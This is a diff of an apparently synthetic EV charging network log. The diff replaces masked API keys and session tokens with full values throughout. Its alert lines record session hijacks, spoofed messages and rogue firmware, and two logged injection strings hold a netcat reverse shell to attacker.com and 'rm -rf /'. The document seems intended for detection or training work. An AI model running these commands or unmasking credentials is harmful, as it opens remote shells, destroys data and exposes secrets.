@@ -11,7 +11,7 @@
 2025-11-04T19:53:22.920642 - INFO EVENT 218 - user=user0166 - payment_success amount=289TL - method=card
 2025-11-04T19:53:32.920642 - INFO EVENT 111 - station=EVS050 - charging_start user=user0017 - session_id=L20hLSa4
 2025-11-04T19:53:36.920642 - INFO EVENT 397 - user=user0140 - auth token=Psj********* - ip=193.169.95.22
-2025-11-04T19:53:40.920642 - ALERT EVENT 251 - admin_api - set_price station=EVS040 price=2TL/kWh - source=api_key_O9v0*********** - ip=198.169.40.250
+2025-11-04T19:53:40.920642 - ALERT EVENT 251 - admin_api - set_price station=EVS040 price=2TL/kWh - source=api_key_O9v0ez99kT9VQBSp - ip=198.169.40.250
 2025-11-04T19:53:40.920642 - INFO EVENT 407 - station=EVS033 - charging_start user=user0197 - session_id=s7QHgsDO
 2025-11-04T19:53:42.920642 - INFO EVENT 194 - station=EVS002 - charging_complete user=user0174 - energy=24kWh
 2025-11-04T19:53:46.920642 - INFO EVENT 291 - user=user0148 - auth token=uZq********* - ip=203.171.176.109
@@ -51,7 +51,7 @@
 2025-11-04T19:57:47.920642 - INFO EVENT 480 - station=EVS041 - charging_start user=user0019 - session_id=T8urzol0
 2025-11-04T19:57:53.920642 - INFO EVENT 289 - user=user0165 - payment_success amount=172TL - method=card
 2025-11-04T19:57:56.920642 - INFO EVENT 271 - station=EVS025 - charging_start user=user0107 - session_id=ttKBdMRq
-2025-11-04T19:58:10.920642 - INFO EVENT 254 - user=user0129 - auth token=5E9N*********** - ip=200.169.82.177 - session_start
+2025-11-04T19:58:10.920642 - INFO EVENT 254 - user=user0129 - auth token=5E9NyBSMWpiE - ip=200.169.82.177 - session_start
 2025-11-04T19:58:11.920642 - INFO EVENT 68 - station=EVS006 - status_check result=OK - temp=36C
 2025-11-04T19:58:18.920642 - INFO EVENT 54 - user=user0140 - payment_success amount=187TL - method=card
 2025-11-04T19:58:21.920642 - INFO EVENT 51 - user=user0066 - auth token=B68********* - ip=194.169.41.219
@@ -67,7 +67,7 @@
 2025-11-04T20:00:40.920642 - INFO EVENT 23 - user=user0113 - auth token=UPQ********* - ip=200.169.180.69
 2025-11-04T20:00:58.920642 - INFO EVENT 253 - user=user0016 - auth token=8FB********* - ip=193.168.147.163
 2025-11-04T20:01:41.920642 - INFO EVENT 38 - user=user0171 - payment_success amount=159TL - method=card
-2025-11-04T20:01:45.920642 - ALERT EVENT 315 - admin_api - set_price station=EVS019 price=3TL/kWh - source=api_key_7PSH*********** - ip=196.171.50.219
+2025-11-04T20:01:45.920642 - ALERT EVENT 315 - admin_api - set_price station=EVS019 price=3TL/kWh - source=api_key_7PSHOVfiG6J8q39e - ip=196.171.50.219
 2025-11-04T20:01:49.920642 - INFO EVENT 242 - user=user0150 - auth token=M4E********* - ip=199.172.58.163
 2025-11-04T20:02:02.920642 - INFO EVENT 297 - station=EVS021 - status_check result=OK - temp=36C
 2025-11-04T20:02:07.920642 - INFO EVENT 456 - station=EVS015 - status_check result=OK - temp=38C
@@ -80,14 +80,14 @@
 2025-11-04T20:02:33.920642 - INFO EVENT 313 - station=EVS031 - charging_start user=user0200 - session_id=4hoNGyMn
 2025-11-04T20:02:35.920642 - INFO EVENT 339 - user=user0150 - auth token=2gP********* - ip=196.169.149.244
 2025-11-04T20:02:38.920642 - INFO EVENT 437 - station=EVS012 - charging_complete user=user0047 - energy=64kWh
-2025-11-04T20:03:23.920642 - ALERT EVENT 216 - admin_api - set_price station=EVS017 price=5TL/kWh - source=api_key_enRL*********** - ip=201.169.103.173
+2025-11-04T20:03:23.920642 - ALERT EVENT 216 - admin_api - set_price station=EVS017 price=5TL/kWh - source=api_key_enRL7SqWDs1hWymO - ip=201.169.103.173
 2025-11-04T20:03:27.920642 - INFO EVENT 367 - station=EVS031 - charging_complete user=user0021 - energy=35kWh
 2025-11-04T20:03:40.920642 - INFO EVENT 346 - user=user0046 - payment_success amount=230TL - method=card
 2025-11-04T20:03:56.920642 - INFO EVENT 474 - user=user0105 - payment_success amount=196TL - method=card
 2025-11-04T20:04:03.920642 - INFO EVENT 82 - station=EVS020 - charging_complete user=user0108 - energy=65kWh
 2025-11-04T20:04:11.920642 - INFO EVENT 171 - station=EVS032 - charging_start user=user0012 - session_id=jcTjnJB1
 2025-11-04T20:04:18.920642 - INFO EVENT 499 - station=EVS002 - charging_complete user=user0124 - energy=79kWh
-2025-11-04T20:04:42.920642 - INFO EVENT 493 - user=user0079 - session_resume token=A0lj*********** - original_user=user0124 - status=hijacked - ip=192.168.182.85
+2025-11-04T20:04:42.920642 - INFO EVENT 493 - user=user0079 - session_resume token=A0ljeekzsqbk - original_user=user0124 - status=hijacked - ip=192.168.182.85
 2025-11-04T20:04:43.920642 - WARN EVENT 421 - user=user0190 - command_param="| nc -e /bin/bash attacker.com 4444" - note=possible_injection - ip=193.168.17.192
 2025-11-04T20:05:04.920642 - INFO EVENT 162 - station=EVS035 - status_check result=OK - temp=35C
 2025-11-04T20:05:07.920642 - INFO EVENT 414 - user=user0029 - payment_success amount=259TL - method=card
@@ -100,7 +100,7 @@
 2025-11-04T20:06:07.920642 - INFO EVENT 37 - station=EVS021 - charging_start user=user0085 - session_id=rOos2lLm
 2025-11-04T20:06:23.920642 - INFO EVENT 424 - station=EVS030 - charging_complete user=user0172 - energy=45kWh
 2025-11-04T20:06:30.920642 - INFO EVENT 374 - station=EVS041 - charging_complete user=user0103 - energy=35kWh
-2025-11-04T20:06:33.920642 - ALERT EVENT 39 - admin_api - set_price station=EVS024 price=3TL/kWh - source=api_key_JVxn*********** - ip=193.168.253.165
+2025-11-04T20:06:33.920642 - ALERT EVENT 39 - admin_api - set_price station=EVS024 price=3TL/kWh - source=api_key_JVxnO6sazm4mBQR5 - ip=193.168.253.165
 2025-11-04T20:06:42.920642 - INFO EVENT 94 - user=user0133 - payment_success amount=269TL - method=card
 2025-11-04T20:06:42.920642 - INFO EVENT 377 - user=user0001 - payment_success amount=170TL - method=card
 2025-11-04T20:06:52.920642 - INFO EVENT 25 - station=EVS022 - charging_complete user=user0139 - energy=47kWh
@@ -111,7 +111,7 @@
 2025-11-04T20:07:31.920642 - INFO EVENT 452 - user=user0002 - auth token=d9C********* - ip=196.168.49.181
 2025-11-04T20:07:37.920642 - WARN EVENT 117 - message_integrity_fail station=EVS002 - spoofed_sender=203.168.18.101 - original_station=EVS012
 2025-11-04T20:07:37.920642 - INFO EVENT 453 - user=user0022 - auth token=rnu********* - ip=194.169.3.193
-2025-11-04T20:07:38.920642 - INFO EVENT 78 - user=user0183 - auth token=a8Fu*********** - ip=193.172.47.133 - session_start
+2025-11-04T20:07:38.920642 - INFO EVENT 78 - user=user0183 - auth token=a8Fu3DqEM53f - ip=193.172.47.133 - session_start
 2025-11-04T20:07:42.920642 - INFO EVENT 275 - station=EVS024 - charging_start user=user0075 - session_id=LQXjSXOp
 2025-11-04T20:07:44.920642 - INFO EVENT 221 - station=EVS003 - charging_complete user=user0037 - energy=30kWh
 2025-11-04T20:07:49.920642 - INFO EVENT 76 - station=EVS037 - status_check result=OK - temp=34C
@@ -119,7 +119,7 @@
 2025-11-04T20:08:09.920642 - INFO EVENT 241 - station=EVS017 - charging_complete user=user0182 - energy=24kWh
 2025-11-04T20:08:13.920642 - INFO EVENT 135 - station=EVS026 - charging_complete user=user0070 - energy=57kWh
 2025-11-04T20:08:16.920642 - INFO EVENT 129 - station=EVS047 - charging_start user=user0001 - session_id=bEfuOlx7
-2025-11-04T20:08:22.920642 - ALERT EVENT 411 - admin_api - set_price station=EVS043 price=4TL/kWh - source=api_key_2rSy*********** - ip=197.172.5.191
+2025-11-04T20:08:22.920642 - ALERT EVENT 411 - admin_api - set_price station=EVS043 price=4TL/kWh - source=api_key_2rSyOEX0iGyJXc0D - ip=197.172.5.191
 2025-11-04T20:08:37.920642 - INFO EVENT 182 - user=user0125 - payment_success amount=138TL - method=card
 2025-11-04T20:08:41.920642 - INFO EVENT 274 - station=EVS038 - charging_complete user=user0153 - energy=45kWh
 2025-11-04T20:08:42.920642 - INFO EVENT 65 - station=EVS048 - charging_start user=user0108 - session_id=YuJNEEqY
@@ -134,10 +134,10 @@
 2025-11-04T20:09:41.920642 - INFO EVENT 112 - user=user0025 - auth token=LlO********* - ip=196.171.2.250
 2025-11-04T20:09:48.920642 - INFO EVENT 383 - station=EVS046 - charging_complete user=user0014 - energy=35kWh
 2025-11-04T20:09:51.920642 - INFO EVENT 137 - station=EVS036 - status_check result=OK - temp=39C
-2025-11-04T20:09:52.920642 - ALERT EVENT 166 - admin_api - set_price station=EVS001 price=4TL/kWh - source=api_key_OFoI*********** - ip=200.168.199.54
+2025-11-04T20:09:52.920642 - ALERT EVENT 166 - admin_api - set_price station=EVS001 price=4TL/kWh - source=api_key_OFoI6ctAXUJ1SzM1 - ip=200.168.199.54
 2025-11-04T20:09:53.920642 - INFO EVENT 248 - user=user0001 - auth token=Ae5********* - ip=197.168.149.184
 2025-11-04T20:09:58.920642 - INFO EVENT 56 - station=EVS010 - status_check result=OK - temp=35C
-2025-11-04T20:09:58.920642 - INFO EVENT 240 - user=user0008 - session_resume token=VwHZ*********** - original_user=user0009 - status=hijacked - ip=199.172.67.166
+2025-11-04T20:09:58.920642 - INFO EVENT 240 - user=user0008 - session_resume token=VwHZmb5IqQpD - original_user=user0009 - status=hijacked - ip=199.172.67.166
 2025-11-04T20:10:16.920642 - INFO EVENT 239 - station=EVS045 - charging_complete user=user0159 - energy=20kWh
 2025-11-04T20:10:22.920642 - INFO EVENT 312 - station=EVS020 - charging_start user=user0128 - session_id=LmZZNCOH
 2025-11-04T20:10:23.920642 - INFO EVENT 489 - user=user0155 - payment_success amount=143TL - method=card
@@ -159,14 +159,14 @@
 2025-11-04T20:12:26.920642 - INFO EVENT 443 - user=user0019 - auth token=7lr********* - ip=200.171.104.226
 2025-11-04T20:12:30.920642 - INFO EVENT 243 - user=user0086 - auth token=Dml********* - ip=195.171.155.187
 2025-11-04T20:12:48.920642 - INFO EVENT 30 - user=user0004 - payment_success amount=268TL - method=card
-2025-11-04T20:13:08.920642 - INFO EVENT 64 - user=user0171 - session_resume token=A8u0*********** - original_user=user0196 - status=hijacked - ip=196.169.161.116
+2025-11-04T20:13:08.920642 - INFO EVENT 64 - user=user0171 - session_resume token=A8u0J9KXiboA - original_user=user0196 - status=hijacked - ip=196.169.161.116
 2025-11-04T20:13:17.920642 - INFO EVENT 279 - station=EVS037 - charging_complete user=user0152 - energy=40kWh
 2025-11-04T20:13:23.920642 - INFO EVENT 365 - user=user0090 - payment_success amount=162TL - method=card
 2025-11-04T20:13:24.920642 - INFO EVENT 185 - user=user0077 - payment_success amount=232TL - method=card
 2025-11-04T20:13:26.920642 - INFO EVENT 124 - station=EVS049 - charging_start user=user0014 - session_id=K8hhUlYf
 2025-11-04T20:13:39.920642 - INFO EVENT 178 - user=user0055 - auth token=ap1********* - ip=192.171.224.46
 2025-11-04T20:13:47.920642 - INFO EVENT 442 - station=EVS008 - charging_complete user=user0171 - energy=41kWh
-2025-11-04T20:13:50.920642 - INFO EVENT 486 - user=user0198 - auth token=jeLQ*********** - ip=196.169.221.91 - session_start
+2025-11-04T20:13:50.920642 - INFO EVENT 486 - user=user0198 - auth token=jeLQorCZImHB - ip=196.169.221.91 - session_start
 2025-11-04T20:13:51.920642 - INFO EVENT 131 - station=EVS017 - charging_start user=user0016 - session_id=xE6hYfLg
 2025-11-04T20:13:54.920642 - INFO EVENT 343 - station=EVS036 - status_check result=OK - temp=37C
 2025-11-04T20:13:56.920642 - INFO EVENT 10 - station=EVS040 - charging_start user=user0020 - session_id=AJHy6CoV
@@ -182,7 +182,7 @@
 2025-11-04T20:15:07.920642 - INFO EVENT 40 - user=user0084 - auth token=p6g********* - ip=193.172.45.197
 2025-11-04T20:15:08.920642 - INFO EVENT 277 - user=user0006 - auth token=Zsb********* - ip=195.169.252.47
 2025-11-04T20:15:13.920642 - INFO EVENT 487 - station=EVS028 - status_check result=OK - temp=45C
-2025-11-04T20:15:15.920642 - INFO EVENT 266 - user=user0165 - auth token=o4nu*********** - ip=198.172.89.124 - session_start
+2025-11-04T20:15:15.920642 - INFO EVENT 266 - user=user0165 - auth token=o4nuh6A0CSL6 - ip=198.172.89.124 - session_start
 2025-11-04T20:15:21.920642 - INFO EVENT 381 - station=EVS002 - charging_complete user=user0006 - energy=61kWh
 2025-11-04T20:15:22.920642 - INFO EVENT 459 - user=user0128 - payment_success amount=98TL - method=card
 2025-11-04T20:15:23.920642 - INFO EVENT 344 - station=EVS046 - status_check result=OK - temp=37C
@@ -191,11 +191,11 @@
 2025-11-04T20:15:45.920642 - INFO EVENT 233 - station=EVS050 - charging_start user=user0022 - session_id=ThVSQIWA
 2025-11-04T20:15:55.920642 - INFO EVENT 80 - station=EVS021 - status_check result=OK - temp=35C
 2025-11-04T20:15:56.920642 - WARN EVENT 461 - data_transfer user=user0036 - unusual_volume=802MB - destination=196.171.192.187 - encrypted=false
-2025-11-04T20:15:58.920642 - INFO EVENT 9 - user=user0174 - auth token=tMtZ*********** - ip=193.168.29.155 - session_start
+2025-11-04T20:15:58.920642 - INFO EVENT 9 - user=user0174 - auth token=tMtZ5LRWNvTk - ip=193.168.29.155 - session_start
 2025-11-04T20:16:08.920642 - INFO EVENT 408 - station=EVS017 - charging_complete user=user0058 - energy=42kWh
 2025-11-04T20:16:16.920642 - INFO EVENT 448 - user=user0149 - auth token=Pct********* - ip=192.168.209.13
 2025-11-04T20:16:17.920642 - INFO EVENT 295 - station=EVS036 - charging_complete user=user0022 - energy=51kWh
-2025-11-04T20:16:22.920642 - INFO EVENT 62 - user=user0072 - session_resume token=5XEo*********** - original_user=user0182 - status=hijacked - ip=203.171.177.36
+2025-11-04T20:16:22.920642 - INFO EVENT 62 - user=user0072 - session_resume token=5XEo88dshBBG - original_user=user0182 - status=hijacked - ip=203.171.177.36
 2025-11-04T20:16:24.920642 - INFO EVENT 348 - station=EVS048 - status_check result=OK - temp=25C
 2025-11-04T20:16:41.920642 - INFO EVENT 79 - station=EVS005 - charging_start user=user0127 - session_id=rza6roaq
 2025-11-04T20:16:42.920642 - INFO EVENT 347 - station=EVS047 - charging_start user=user0078 - session_id=mELhn14P
@@ -210,9 +210,9 @@
 2025-11-04T20:17:21.920642 - WARN EVENT 416 - message_integrity_fail station=EVS041 - spoofed_sender=198.168.235.104 - original_station=EVS007
 2025-11-04T20:17:24.920642 - WARN EVENT 352 - message_integrity_fail station=EVS046 - spoofed_sender=194.168.152.61 - original_station=EVS040
 2025-11-04T20:17:40.920642 - INFO EVENT 42 - station=EVS023 - charging_complete user=user0034 - energy=80kWh
-2025-11-04T20:17:42.920642 - INFO EVENT 22 - user=user0001 - session_resume token=f8dR*********** - original_user=user0149 - status=hijacked - ip=197.170.151.64
+2025-11-04T20:17:42.920642 - INFO EVENT 22 - user=user0001 - session_resume token=f8dRydaTWUZB - original_user=user0149 - status=hijacked - ip=197.170.151.64
 2025-11-04T20:17:46.920642 - INFO EVENT 316 - user=user0039 - auth token=GHV********* - ip=202.170.81.128
-2025-11-04T20:18:02.920642 - ALERT EVENT 255 - admin_api - set_price station=EVS005 price=5TL/kWh - source=api_key_GmN1*********** - ip=195.170.89.164
+2025-11-04T20:18:02.920642 - ALERT EVENT 255 - admin_api - set_price station=EVS005 price=5TL/kWh - source=api_key_GmN1eSf6SiTJ8K7O - ip=195.170.89.164
 2025-11-04T20:18:09.920642 - INFO EVENT 393 - station=EVS003 - charging_complete user=user0093 - energy=36kWh
 2025-11-04T20:18:16.920642 - CRITICAL EVENT 330 - firmware_update station=EVS006 version=v5.9.52 - checksum=cfvscB8xFlwdpc2rBcuskWVLHd2lhz9s - source=unknown - ip=192.172.200.244
 2025-11-04T20:18:23.920642 - INFO EVENT 370 - station=EVS020 - status_check result=OK - temp=39C
@@ -237,7 +237,7 @@
 2025-11-04T20:20:28.920642 - INFO EVENT 258 - station=EVS048 - status_check result=OK - temp=43C
 2025-11-04T20:20:42.920642 - INFO EVENT 265 - user=user0046 - payment_success amount=78TL - method=card
 2025-11-04T20:20:43.920642 - INFO EVENT 12 - user=user0096 - auth token=BtY********* - ip=199.168.82.81
-2025-11-04T20:20:45.920642 - ALERT EVENT 199 - admin_api - set_price station=EVS004 price=4TL/kWh - source=api_key_Wn9F*********** - ip=198.168.142.47
+2025-11-04T20:20:45.920642 - ALERT EVENT 199 - admin_api - set_price station=EVS004 price=4TL/kWh - source=api_key_Wn9FhhZruZgZnxxK - ip=198.168.142.47
 2025-11-04T20:20:51.920642 - INFO EVENT 1 - station=EVS024 - charging_start user=user0077 - session_id=LWlzkF7l
 2025-11-04T20:20:54.920642 - INFO EVENT 126 - station=EVS031 - charging_complete user=user0130 - energy=43kWh
 2025-11-04T20:20:59.920642 - INFO EVENT 479 - user=user0028 - auth token=QRd********* - ip=202.168.9.208
@@ -253,7 +253,7 @@
 2025-11-04T20:21:54.920642 - INFO EVENT 63 - user=user0005 - auth token=jRC********* - ip=201.172.251.189
 2025-11-04T20:21:58.920642 - INFO EVENT 355 - station=EVS039 - charging_complete user=user0144 - energy=63kWh
 2025-11-04T20:22:04.920642 - INFO EVENT 33 - station=EVS006 - status_check result=OK - temp=40C
-2025-11-04T20:22:04.920642 - ALERT EVENT 432 - admin_api - set_price station=EVS046 price=2TL/kWh - source=api_key_OhAM*********** - ip=196.170.94.145
+2025-11-04T20:22:04.920642 - ALERT EVENT 432 - admin_api - set_price station=EVS046 price=2TL/kWh - source=api_key_OhAMY4TYhBgJ9Boo - ip=196.170.94.145
 2025-11-04T20:22:05.920642 - INFO EVENT 387 - station=EVS005 - status_check result=OK - temp=27C
 2025-11-04T20:22:19.920642 - INFO EVENT 269 - station=EVS004 - charging_complete user=user0084 - energy=47kWh
 2025-11-04T20:22:31.920642 - ALERT EVENT 385 - unauthorized_admin_access user=user0078 - privilege_escalation=true - ip=194.170.193.96 - timestamp_anomaly=detected
@@ -329,7 +329,7 @@
 2025-11-04T20:32:35.920642 - INFO EVENT 447 - station=EVS045 - charging_complete user=user0171 - energy=71kWh
 2025-11-04T20:32:36.920642 - INFO EVENT 257 - station=EVS019 - charging_start user=user0182 - session_id=Wgn6h2RM
 2025-11-04T20:32:39.920642 - INFO EVENT 280 - user=user0112 - payment_success amount=62TL - method=card
-2025-11-04T20:32:45.920642 - INFO EVENT 184 - user=user0016 - session_resume token=OLiV*********** - original_user=user0043 - status=hijacked - ip=194.169.35.103
+2025-11-04T20:32:45.920642 - INFO EVENT 184 - user=user0016 - session_resume token=OLiV9U4i9yKe - original_user=user0043 - status=hijacked - ip=194.169.35.103
 2025-11-04T20:32:50.920642 - INFO EVENT 300 - user=user0015 - auth token=Wxm********* - ip=201.171.47.37
 2025-11-04T20:32:54.920642 - INFO EVENT 250 - station=EVS033 - status_check result=OK - temp=31C
 2025-11-04T20:33:03.920642 - INFO EVENT 327 - station=EVS029 - charging_start user=user0145 - session_id=ajdJomT1
@@ -361,7 +361,7 @@
 2025-11-04T20:37:05.920642 - INFO EVENT 45 - user=user0029 - auth token=iZJ********* - ip=193.168.84.82
 2025-11-04T20:37:37.920642 - INFO EVENT 220 - station=EVS016 - status_check result=OK - temp=30C
 2025-11-04T20:37:39.920642 - INFO EVENT 497 - user=user0017 - payment_success amount=185TL - method=card
-2025-11-04T20:37:41.920642 - INFO EVENT 123 - user=user0177 - auth token=zSec*********** - ip=203.169.216.205 - session_start
+2025-11-04T20:37:41.920642 - INFO EVENT 123 - user=user0177 - auth token=zSecqyXR0Ldc - ip=203.169.216.205 - session_start
 2025-11-04T20:37:48.920642 - INFO EVENT 438 - station=EVS044 - status_check result=OK - temp=27C
 2025-11-04T20:37:52.920642 - INFO EVENT 321 - station=EVS040 - charging_complete user=user0064 - energy=17kWh
 2025-11-04T20:37:57.920642 - INFO EVENT 403 - station=EVS041 - status_check result=OK - temp=29C
@@ -390,10 +390,10 @@
 2025-11-04T20:41:08.920642 - INFO EVENT 198 - user=user0089 - payment_success amount=60TL - method=card
 2025-11-04T20:41:13.920642 - INFO EVENT 404 - user=user0156 - payment_success amount=258TL - method=card
 2025-11-04T20:41:19.920642 - INFO EVENT 228 - station=EVS045 - charging_start user=user0159 - session_id=EigdM2vP
-2025-11-04T20:41:27.920642 - ALERT EVENT 215 - admin_api - set_price station=EVS002 price=3TL/kWh - source=api_key_3CPV*********** - ip=202.170.231.135
+2025-11-04T20:41:27.920642 - ALERT EVENT 215 - admin_api - set_price station=EVS002 price=3TL/kWh - source=api_key_3CPVfuK9yE8UY53T - ip=202.170.231.135
 2025-11-04T20:41:42.920642 - INFO EVENT 110 - station=EVS019 - charging_start user=user0105 - session_id=all3YlyP
 2025-11-04T20:41:47.920642 - INFO EVENT 247 - station=EVS029 - charging_complete user=user0100 - energy=62kWh
-2025-11-04T20:41:54.920642 - INFO EVENT 405 - user=user0161 - auth token=X6Aj*********** - ip=197.172.95.178 - session_start
+2025-11-04T20:41:54.920642 - INFO EVENT 405 - user=user0161 - auth token=X6AjuK1MgTK0 - ip=197.172.95.178 - session_start
 2025-11-04T20:42:02.920642 - INFO EVENT 43 - user=user0004 - auth token=U1Q********* - ip=203.168.254.206
 2025-11-04T20:42:04.920642 - INFO EVENT 193 - user=user0080 - payment_success amount=201TL - method=card
 2025-11-04T20:42:06.920642 - INFO EVENT 246 - station=EVS044 - charging_complete user=user0027 - energy=70kWh
@@ -424,7 +424,7 @@
 2025-11-04T20:44:07.920642 - INFO EVENT 350 - user=user0107 - payment_success amount=262TL - method=card
 2025-11-04T20:44:11.920642 - INFO EVENT 231 - user=user0155 - payment_success amount=277TL - method=card
 2025-11-04T20:44:14.920642 - INFO EVENT 434 - station=EVS024 - charging_start user=user0079 - session_id=saOVarWq
-2025-11-04T20:44:24.920642 - INFO EVENT 282 - user=user0056 - auth token=ixCU*********** - ip=196.172.95.40 - session_start
+2025-11-04T20:44:24.920642 - INFO EVENT 282 - user=user0056 - auth token=ixCUhgYdCu5N - ip=196.172.95.40 - session_start
 2025-11-04T20:44:28.920642 - INFO EVENT 156 - user=user0150 - auth token=EGh********* - ip=202.169.23.78
 2025-11-04T20:44:33.920642 - INFO EVENT 72 - station=EVS031 - status_check result=OK - temp=40C
 2025-11-04T20:44:33.920642 - INFO EVENT 263 - station=EVS010 - charging_start user=user0002 - session_id=GA0fYSfT
@@ -454,7 +454,7 @@
 2025-11-04T20:47:04.920642 - INFO EVENT 192 - station=EVS013 - status_check result=OK - temp=45C
 2025-11-04T20:47:15.920642 - WARN EVENT 471 - user=user0136 - command_param="rm -rf /; reboot" - note=possible_injection - ip=197.168.88.72
 2025-11-04T20:47:19.920642 - INFO EVENT 476 - user=user0178 - auth token=gZR********* - ip=195.172.32.187
-2025-11-04T20:47:22.920642 - INFO EVENT 423 - user=user0142 - session_resume token=iB4p*********** - original_user=user0040 - status=hijacked - ip=194.168.38.89
+2025-11-04T20:47:22.920642 - INFO EVENT 423 - user=user0142 - session_resume token=iB4prEEOdIGS - original_user=user0040 - status=hijacked - ip=194.168.38.89
 2025-11-04T20:47:23.920642 - INFO EVENT 376 - station=EVS015 - charging_complete user=user0161 - energy=44kWh
 2025-11-04T20:47:33.920642 - INFO EVENT 324 - station=EVS030 - charging_start user=user0190 - session_id=B8xdX324
 2025-11-04T20:47:37.920642 - INFO EVENT 24 - station=EVS003 - charging_complete user=user0006 - energy=60kWh
@@ -468,7 +468,7 @@
 2025-11-04T20:48:53.920642 - INFO EVENT 202 - user=user0034 - auth token=f6e********* - ip=198.172.234.210
 2025-11-04T20:49:01.920642 - INFO EVENT 418 - station=EVS018 - charging_start user=user0200 - session_id=7mnd2cqZ
 2025-11-04T20:49:12.920642 - INFO EVENT 392 - station=EVS020 - charging_complete user=user0173 - energy=28kWh
-2025-11-04T20:49:24.920642 - INFO EVENT 390 - user=user0083 - session_resume token=Z4v5*********** - original_user=user0037 - status=hijacked - ip=193.171.105.163
+2025-11-04T20:49:24.920642 - INFO EVENT 390 - user=user0083 - session_resume token=Z4v5L6WsMxgc - original_user=user0037 - status=hijacked - ip=193.171.105.163
 2025-11-04T20:49:25.920642 - INFO EVENT 412 - user=user0018 - payment_success amount=283TL - method=card
 2025-11-04T20:49:37.920642 - INFO EVENT 55 - user=user0059 - auth token=oRd********* - ip=202.168.241.249
 2025-11-04T20:49:37.920642 - INFO EVENT 77 - station=EVS003 - charging_complete user=user0040 - energy=78kWh
